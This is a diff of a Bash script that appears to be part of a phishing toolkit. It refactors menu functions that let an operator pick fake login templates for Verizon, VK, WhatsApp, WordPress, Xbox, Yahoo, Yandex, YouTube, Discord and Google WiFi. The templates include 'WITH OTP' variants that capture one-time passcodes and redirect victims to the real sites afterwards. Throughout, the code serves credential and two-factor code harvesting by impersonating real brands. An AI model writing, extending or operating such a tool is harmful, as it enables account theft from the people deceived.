-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_verizon(){
+        site_name="Verizon"
+        dgfname="verizon"
+        rdurl="www.verizon.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="verizon"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="verizon/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_verizon; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="verizon"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="verizon/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                                { sleep 1; banner; login_verizon; };;
+        esac
 }
 #visim
-site_visim(){
-website="visim"
-rdurl="www.myvi.in/"
-siname="VI sim"
-dgfname="visim"
-sitype="Default"
-tunnelmenu
+login_visim(){
+        site_id="visim"
+        rdurl="www.myvi.in/"
+        site_name="VI sim"
+        dgfname="visim"
+        capture_type="OOTP"
+        site_template="Default"
 }
 #vk
-site_vk(){
-siname="VK"
-rdurl="vk.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} VK - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} VK - WITH OTP ${NC}"
-echo -e "${BLUE}[03]${CYAN} VK poll - WITHOUT OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_vk(){
+        site_name="VK"
+        rdurl="vk.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} VK - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} VK - WITH OTP ${NC}"
+        echo -e "${BLUE}[03]${CYAN} VK poll - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="vk"
-                sitype="Default"
-                dgfname="vk"
-                tunnelmenu;;
-        2 | 02)
-                website="vk/otp"
-                sitype="OTP"
-                dgfname="vk"
-                tunnelmenu;;
-        3 | 03)
-                website="vk_poll"
-                sitype="Poll"
-                dgfname="vk_poll"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_vk; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="vk"
+                        capture_type="NOTP"
+                        site_template="Default"
+                        dgfname="vk" ;;
+                2 | 02)
+                        site_id="vk/otp"
+                        capture_type="POTP"
+                        site_template="OTP"
+                        dgfname="vk" ;;
+                3 | 03)
+                        site_id="vk_poll"
+                        capture_type="NOTP"
+                        site_template="Poll"
+                        dgfname="vk_poll" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                                { sleep 1; banner; login_vk; };;
+        esac
 }
 #whatsapp
-site_whatsapp(){
-website="whatsapp"
-rdurl="www.web.whatsapp.com"
-siname="WhatsApp"
-dgfname="whatsapp"
-sitype="Default"
-tunnelmenu
+login_whatsapp(){
+        site_id="whatsapp"
+        rdurl="www.web.whatsapp.com"
+        site_name="WhatsApp"
+        dgfname="whatsapp"
+        capture_type="OOTP"
+        site_template="Default"
 }
 #wordpress
-site_wordpress(){
-siname="Wordpress"
-dgfname="wordpress"
-rdurl="wordpress.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_wordpress(){
+        site_name="Wordpress"
+        dgfname="wordpress"
+        rdurl="wordpress.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="wordpress"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="wordpress/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_wordpress; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="wordpress"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="wordpress/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                                { sleep 1; banner; login_wordpress; };;
+        esac
 }
 #xbox
-site_xbox(){
-siname="Xbox"
-dgfname="xbox"
-rdurl="www.xbox.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_xbox(){
+        site_name="Xbox"
+        dgfname="xbox"
+        rdurl="www.xbox.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="xbox"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="xbox/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_xbox; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="xbox"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="xbox/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                                { sleep 1; banner; login_xbox; };;
+        esac
 }
 #yahoo
-site_yahoo(){
-siname="Yahoo"
-dgfname="yahoo"
-rdurl="yahoo.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_yahoo(){
+        site_name="Yahoo"
+        dgfname="yahoo"
+        rdurl="yahoo.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="yahoo"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="yahoo/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_yahoo; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="yahoo"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="yahoo/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                                { sleep 1; banner; login_yahoo; };;
+        esac
 }
 #yandex
-site_yandex(){
-siname="Yandex"
-dgfname="yandex"
-rdurl="yandex.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_yandex(){
+        site_name="Yandex"
+        dgfname="yandex"
+        rdurl="yandex.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="yandex"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="yandex/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_yandex; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="yandex"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="yandex/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                                { sleep 1; banner; login_yandex; };;
+        esac
 }
 #ytsubs
-site_ytsubs(){
-siname="YT subs"
-dgfname="ytsubs"
-rdurl="www.youtube.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_ytsubs(){
+        site_name="YT subs"
+        dgfname="ytsubs"
+        rdurl="www.youtube.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="ytsubs"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="ytsubs/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_ytsubs; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="ytsubs"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="ytsubs/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                                { sleep 1; banner; login_ytsubs; };;
+        esac
 }
 
 #discord
-site_discord(){
-siname="Discord"
-dgfname="discord"
-rdurl="www.discord.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_discord(){
+        site_name="Discord"
+        dgfname="discord"
+        rdurl="www.discord.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="discord"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="discord/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_discord; };;
-esac
-}
-#jiorouter
-site_jiorouter(){
-siname="Jio Router"
-dgfname="jiorouter"
-rdurl="www.jio.com/business/jiofi"
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
-
-case $sichoice in
- 
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; banner; site_jiorouter; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="discord"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="discord/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                                { sleep 1; banner; login_discord; };;
+        esac
 }
 #googlewifi
-site_googlewifi(){
-website="googlewifi"
-rdurl="fiber.google.com/wifi/"
-siname="Google WIFI"
-dgfname="google_wifi"
-sitype="Default"
-tunnelmenu
+login_googlewifi(){
+        site_id="googlewifi"
+        rdurl="fiber.google.com/wifi/"
+        site_name="Google WIFI"
+        dgfname="google_wifi"
+        capture_type="NOTP"
+        site_template="Default"
 }
 #pattern
-site_pattern(){
-website="pattern"
-rdurl=""
-dgfname="pattern"
-siname="Pattern"
-sitype="Default"
-tunnelmenu
+login_pattern(){
+        site_id="pattern"
+        rdurl=""
+        dgfname="pattern"
+        site_name="Pattern"
+        capture_type="NOTP"
+        site_template="Default"
 }
 
 ##MAIN
@@ -3534,4 +3698,4 @@ directories
 kill_pid
 dependencies
 xpermission
-mainmenu
+homepage
